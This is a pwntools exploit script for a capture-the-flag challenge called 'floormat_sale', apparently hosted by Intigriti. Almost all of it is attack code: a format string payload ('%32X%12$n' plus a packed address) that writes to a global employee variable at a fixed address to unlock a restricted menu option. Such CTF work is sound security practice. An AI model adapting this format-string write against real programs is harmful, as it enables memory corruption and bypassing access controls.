#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("floormat_sale")

gs = '''
b employee_access
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("floormatsale.ctf.intigriti.io", 1339)
    else:
        return process(elf.path)

# Plan:
# Overwrite the value of the global eployee variable after selecting the
# exclusive employee mat that is very expensive

# Addresses
employee = 0x40408c

# Functions

io = start()

io.recvuntil(b"Enter your choice:")
io.sendline(b"6")

# The shipping address has a format string vulnerability
#payload = b"\x00\x00\x00\x00\x00\x8c\x40\x40%1000c%10$n"
payload = b"%32X%12$nAAAAAAA" + p64(employee)
io.recvuntil(b"Please enter your shipping address:")
io.sendline(payload)

print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))

io.interactive()
